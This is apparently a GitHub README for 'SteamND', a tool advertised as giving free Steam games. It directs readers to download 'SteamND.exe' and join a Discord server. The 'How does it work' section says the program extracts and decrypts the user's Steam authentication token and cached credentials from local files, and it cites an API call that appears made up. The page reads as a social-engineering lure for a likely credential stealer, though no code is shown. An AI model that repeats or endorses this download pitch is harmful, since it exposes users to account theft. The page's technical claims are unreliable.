
<!-- PROJECT LOGO -->
<br />
<div align="center">
  <a href="https://github.com/othneildrew/Best-README-Template">
    <img src="images/steamND.png" alt="Logo" width="80" height="80">
  </a>

  <h3 align="center">SteamND</h3>

  <p align="center">
    Free steam games
    <br />
    <a href="https://discord.gg/6ZZ4ZHTyaP"><strong>Join our discord server »</strong></a>
    <br />
  </p>
</div>

<!-- ABOUT THE PROJECT -->
## How does SteamND work?

SteamND operates by first conducting a thorough search within a local, relational database designed to store game data, querying the titles and associated unique identifiers (IDs) of games via SQL queries or through a more complex NoSQL setup, depending on the scale and requirements of the database schema. Upon identifying the target game, the script proceeds to interact with the Steam database, either through official API endpoints or, in a more hypothetical scenario, through direct interaction with Steam’s internal systems by mimicking API calls. This is done by utilizing endpoints that allow for the retrieval of game metadata, particularly the steam_game_id, which serves as a globally unique identifier for any game available on Steam. Once the script has successfully matched the game both in the local database and Steam’s database, it enters the phase where it requires the user's Steam credentials to authorize the action of adding the game to the Steam library. To accomplish this, the script must extract the user’s Steam authentication token from the local machine. This token, which is typically stored in a file within the Steam installation directory, such as steam_api_token.txt or encrypted in a local SQLite database file, provides the necessary OAuth credentials that authenticate the script’s interaction with the Steam Web API. The extraction process typically involves reading the user’s Steam client configuration files or scanning the Steam installation directory for cached credentials, decrypting them if necessary. Once the script retrieves the authentication token, it proceeds to interact with the Steam API, invoking the appropriate method to add the identified game to the user’s library, such as a call to the ISteamUser/AddGameToLibrary API or a similarly structured request. The request payload includes the validated steam_game_id, ensuring that the correct game is added. After successfully adding the game to the user's library, the script performs a final update to the local database, using the appropriate database command to mark the game as added in the user’s personal library, thus maintaining synchronization between the local data store and Steam’s digital platform. The entire process ensures that all operations are handled programmatically, requiring minimal user interaction, but hinges heavily on a precise, secure extraction of authentication tokens and seamless API integration.

### Installation

_This is how YOU can start getting free steam games._

1. Head on over to the releases
2. Download 'SteamND.exe'
3. Enter the game you want and enjoy!

<!-- USAGE EXAMPLES -->
## Usage

to get free games?...



<!-- ROADMAP -->
## Roadmap

- [ ] Add Changelog
- [ ] Multi-language Support
    - [ ] Chinese
    - [ ] Spanish

<!-- ACKNOWLEDGMENTS -->
## Acknowledgments

Erm im not responsible for this shit
